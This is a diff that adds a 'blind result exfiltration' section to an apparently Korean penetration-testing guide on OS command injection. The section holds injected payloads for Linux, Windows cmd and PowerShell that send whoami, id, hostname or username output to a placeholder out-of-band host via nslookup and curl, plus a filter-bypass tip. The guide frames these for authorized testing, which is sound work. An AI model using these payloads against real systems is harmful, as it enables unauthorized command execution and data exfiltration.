@@ -254,6 +254,28 @@ test%0aecho%20ci_test.jpg
 
 확인은 업로드 응답만 보지 말고 썸네일 생성, 상세 보기, 관리자 검수, 다운로드, 변환 로그까지 이어서 본다.
 
+### 7. 결과 반출 (Blind, 사전 승인 시)
+
+명령은 실행되지만 결과가 응답·로그에 보이지 않을 때, 승인된 OOB 채널로 **짧은 결과만** 실어 실행을 입증한다. 전체 파일이나 대량 데이터를 외부로 보내지 않고 사용자/호스트처럼 영향이 낮은 값만 확인한다. DNS는 문자 제약이 있으므로 영숫자로 좁히거나 hex/base32로 인코딩한다.
+
+```text
+# Linux: 명령 치환 결과를 subdomain 또는 경로에 결합
+;nslookup `whoami`.ci-<RANDOM>.<COLLAB>
+;curl http://ci-<RANDOM>.<COLLAB>/$(id -un)
+;curl -s "http://ci-<RANDOM>.<COLLAB>/?d=$(id | base64 | tr -d '\n')"
+```
+
+```text
+# Windows cmd: for /f로 명령 출력을 변수에 담아 조회
+& for /f %i in ('whoami') do nslookup %i.ci-<RANDOM>.<COLLAB>
+& nslookup %COMPUTERNAME%.ci-<RANDOM>.<COLLAB>
+
+# PowerShell: 키워드 필터 우회가 필요하면 -enc(Base64) 호출도 확인
+& powershell -c "nslookup \"$env:USERNAME.ci-<RANDOM>.<COLLAB>\""
+```
+
+판정은 콜백 수신과 payload별 unique marker로 한다. 특수문자·공백 제약 때문에 치환이 깨지면 반출 없이 콜백만 유발하는 단순 payload(`;nslookup ci-<RANDOM>.<COLLAB>`)로 먼저 실행 여부를 분리한다. 명령 결과를 외부로 보내는 방식은 보안 장비 로그에 남으므로 최소값만, 승인 범위에서만 사용한다.
+
 ## 우회 매트릭스
 
 필터가 보이면 차단된 문자를 기준으로 좁혀간다.
